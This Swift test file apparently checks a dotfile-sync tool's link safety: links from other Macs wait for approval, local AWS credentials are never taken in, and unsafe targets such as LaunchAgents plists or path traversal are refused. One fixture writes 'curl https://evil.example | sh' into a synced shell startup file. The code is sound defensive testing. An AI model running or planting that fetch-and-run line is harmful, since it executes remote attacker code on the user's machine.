import XCTest
@testable import ShrugCore
@testable import ShrugDaemon

/// Links that arrive from the bucket or from other Macs.
final class LinkSafetyTests: ShrugTestCase {
    /// A link that reaches B before its file, as from a Mac that crashed between the two.
    func pushLink(from a: Mac, _ link: Link) {
        a.engine.updateState {
            $0.links.append(link)
            $0.profileDirty = true
            $0.profileGen += 1
            $0.profileEditedAt = a.engine.clock.nowMs
        }
        a.sync()
    }

    func testALinkFromAnotherMacIsOnlyPlacedOnceAgreedToHere() throws {
        let (a, b) = try twoMacsFollowing()
        try a.write("synced/zshenv", Data("curl https://evil.example | sh".utf8))
        a.sync()
        pushLink(from: a, Link(path: "~/.zshenv", target: "synced/zshenv"))
        b.sync()
        b.engine.reconcile()
        XCTAssertEqual(b.engine.found(b.home(".zshenv"), "synced/zshenv"), .nothing, "nothing appears by itself")
        XCTAssertTrue(b.engine.status().notices.contains { $0.contains("~/.zshenv") && $0.contains("shrug use work") })
        XCTAssertEqual(b.engine.status().links.map(\.state), ["added on another Mac: 'shrug use work' to place it"])

        guard case .confirm(let asked) = try b.engine.use("work", choices: [:]) else { return XCTFail("should ask") }
        XCTAssertEqual(asked, [Link(path: "~/.zshenv", target: "synced/zshenv")])
        guard case .done = try b.engine.use("work", choices: [:], approve: []) else { return XCTFail() }
        XCTAssertEqual(b.engine.found(b.home(".zshenv"), "synced/zshenv"), .nothing, "saying no leaves it waiting")
        guard case .confirm = try b.engine.use("work", choices: [:]) else { return XCTFail("and asks again next time") }

        guard case .done = try b.engine.use("work", choices: [:], approve: ["~/.zshenv"]) else { return XCTFail() }
        XCTAssertEqual(b.engine.found(b.home(".zshenv"), "synced/zshenv"), .ourLink)

        // Agreeing lasts while the link stays in the profile, not if it leaves and comes back.
        _ = try b.engine.remove(path: b.home(".zshenv").path)
        b.sync()
        a.sync()
        XCTAssertEqual(a.engine.stateCopy()?.links, [])
        pushLink(from: a, Link(path: "~/.zshenv", target: "synced/zshenv"))
        b.sync()
        b.engine.reconcile()
        XCTAssertEqual(b.engine.stateCopy()?.links.map(\.path), ["~/.zshenv"])
        XCTAssertEqual(b.engine.found(b.home(".zshenv"), "synced/zshenv"), .nothing, "asked again")
    }

    func testLinksPlacedBeforeAgreeingExistedStillCount() throws {
        let (a, b) = try twoMacsFollowing()
        try a.putHome(".kube/config", "context")
        _ = try a.engine.add(path: a.home(".kube/config").path, target: nil, cls: nil, choices: [:])
        a.sync()
        b.sync()
        try follow(b)
        XCTAssertEqual(b.engine.found(b.home(".kube/config"), "synced/kube/config"), .ourLink)
        // State saved by an older Shrug has no list of agreed links, only the ones it placed.
        b.engine.updateState { $0.approved = nil }
        b.engine.reconcile()
        XCTAssertEqual(b.engine.status().links.map(\.state), ["ok"])
        guard case .done = try b.engine.use("work", choices: [:]) else { return XCTFail("nothing to ask") }
    }

    func testALinkFromElsewhereNeverTakesInThisMacsFile() throws {
        let (a, b) = try twoMacsFollowing()
        try b.putHome(".aws/credentials", "B-ONLY aws_secret_access_key=xyz")
        pushLink(from: a, Link(path: "~/.aws/credentials", target: "synced/collected"))
        b.sync()
        try follow(b) // even agreed to, the link never takes B's file in
        b.sync()
        a.sync()

        XCTAssertEqual(b.engine.found(b.home(".aws/credentials"), "synced/collected"), .file, "B's file stays where it is")
        XCTAssertEqual(try String(contentsOf: b.home(".aws/credentials"), encoding: .utf8), "B-ONLY aws_secret_access_key=xyz")
        XCTAssertNil(a.store.entry("synced/collected"), "and never reaches the bucket")
    }

    func testALinkWhoseFileHasntArrivedWaits() throws {
        let (a, b) = try twoMacsFollowing()
        pushLink(from: a, Link(path: "~/.kube/config", target: "synced/kube/config"))
        b.sync()
        try follow(b)
        b.sync()
        XCTAssertNil(b.store.entry("synced/kube/config"), "B doesn't make an empty file that could win over the real one")
        XCTAssertEqual(b.engine.status().links.map(\.state), ["waiting for its file to arrive"])

        try a.mkdirs("synced/kube")
        try a.write("synced/kube/config", Data("the real one".utf8))
        a.sync()
        b.sync()
        b.engine.reconcile()
        XCTAssertEqual(b.engine.found(b.home(".kube/config"), "synced/kube/config"), .ourLink)
        XCTAssertEqual(try b.text("synced/kube/config"), "the real one")
    }

    /// Adding a file on one Mac while another, with its own file there, syncs in between.
    func testAddingNeverLosesTheFileToAnotherMac() throws {
        setenv("SHRUG_DEBOUNCE_SECONDS", "30", 1)
        let (a, b) = try twoMacsFollowing()
        try a.putHome(".kube/config", "A's real kubeconfig")
        try b.putHome(".kube/config", "B's kubeconfig")
        _ = try a.engine.add(path: a.home(".kube/config").path, target: nil, cls: nil, choices: [:])
        a.sync() // the file waits out the debounce, and the link waits for the file
        b.sync()
        b.engine.reconcile()
        XCTAssertEqual(b.engine.stateCopy()?.links, [], "the link doesn't go up before its file")

        a.settle()
        a.sync()
        b.sync()
        b.engine.reconcile()
        b.settle()
        b.sync()
        a.sync()
        XCTAssertEqual(try a.text("synced/kube/config"), "A's real kubeconfig")
        XCTAssertEqual(try b.text("synced/kube/config"), "A's real kubeconfig")
        XCTAssertEqual(try String(contentsOf: b.home(".kube/config"), encoding: .utf8), "B's kubeconfig", "B is asked first")
    }

    func testUnsafeLinksAreNeverPlaced() throws {
        let (a, b) = try twoMacsFollowing()
        try a.write("synced/payload", Data("<plist/>".utf8))
        a.sync()
        let unsafeLinks = [
            Link(path: "~/Library/LaunchAgents/evil.plist", target: "synced/payload"),
            // The folder doesn't exist yet, so only comparing without case catches this one.
            Link(path: "~/library/launchagents/evil2.plist", target: "synced/payload"),
            Link(path: "/tmp/outside", target: "synced/payload"),
            Link(path: "~/../outside", target: "synced/payload"),
            Link(path: "~/.shrug/keyring.json", target: "synced/payload"),
            Link(path: "~/Shrug/synced/loop", target: "synced/payload"),
            Link(path: "~/fine", target: "../payload"),
            Link(path: "~/fine", target: "synced/payload.swp"),
        ]
        for link in unsafeLinks { pushLink(from: a, link) }
        b.sync()
        b.engine.reconcile()

        XCTAssertFalse(FileManager.default.fileExists(atPath: b.home("Library/LaunchAgents/evil.plist").path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: b.home("library/launchagents/evil2.plist").path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: b.home("fine").path))
        XCTAssertTrue(b.engine.status().links.allSatisfy { $0.state.hasPrefix("not placed") })
        XCTAssertTrue(b.engine.status().notices.contains { $0.contains("LaunchAgents") })
        for link in unsafeLinks where link.path.hasPrefix("~/") && !link.path.contains("..") {
            XCTAssertThrowsError(try a.engine.add(path: a.paths.expand(link.path).path, target: link.target, cls: nil, choices: [:]),
                                 link.path)
        }
        XCTAssertThrowsError(try a.engine.add(path: "/tmp/outside", target: nil, cls: nil, choices: [:]))
    }

    func testAnotherLinkInTheWayIsAsked() throws {
        let (a, b) = try twoMacsFollowing()
        try a.putHome(".gitconfig", "[user] name = A")
        _ = try a.engine.add(path: a.home(".gitconfig").path, target: nil, cls: nil, choices: [:])
        a.sync()

        // B's ~/.gitconfig links into its dotfiles repo.
        try b.putHome("dotfiles/gitconfig", "[user] name = B")
        try FileManager.default.createSymbolicLink(at: b.home(".gitconfig"), withDestinationURL: b.home("dotfiles/gitconfig"))
        b.sync()
        b.engine.reconcile()
        XCTAssertEqual(b.engine.found(b.home(".gitconfig"), "synced/gitconfig"), .otherLink, "left alone until B chooses")

        guard case .collisions(let paths) = try follow(b) else { return XCTFail("should ask") }
        XCTAssertEqual(paths, ["~/.gitconfig"])
        guard case .done = try follow(b, choices: ["~/.gitconfig": .mine]) else { return XCTFail() }
        XCTAssertEqual(b.engine.found(b.home(".gitconfig"), "synced/gitconfig"), .ourLink)
        XCTAssertEqual(try b.text("synced/gitconfig"), "[user] name = B", "B's version, read through its link")
    }
}
